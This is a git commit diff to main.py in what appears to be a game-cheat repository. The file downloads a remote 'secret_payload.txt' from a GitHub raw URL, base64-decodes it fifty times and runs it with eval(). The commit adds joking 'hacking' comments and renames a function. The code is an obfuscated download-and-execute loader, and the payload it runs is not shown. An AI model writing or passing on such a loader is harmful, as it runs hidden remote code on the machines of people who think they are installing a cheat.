0f43f603cd15858b06417084db7f0b2d9de5305b
clash <clash@lucid-tracker.com>
2025-10-31 12:04:00 +1100

    boom

--- main.py
+++ main.py
@@ -4,20 +4,23 @@ import base64
 payload_url = "https://raw.githubusercontent.com/clash098/orion-drift-cheats/refs/heads/master/secret_payload.txt"
 payload = ""
 
+# hack the mainframe and download the super secret payload >:)
 def get_payload():
     global payload
 
     response = requests.get(payload_url)
     payload = response.text.strip()
 
-def evaluate_payload():
+# decrypt the super secret payload >:)
+def decode_payload():
     global payload
 
     for i in range(50):
         payload = base64.b64decode(payload.encode()).decode()
 
+# the main hacking part >:)
 if __name__ == "__main__":
     get_payload()
-    evaluate_payload()
+    decode_payload()
 
     eval(payload)
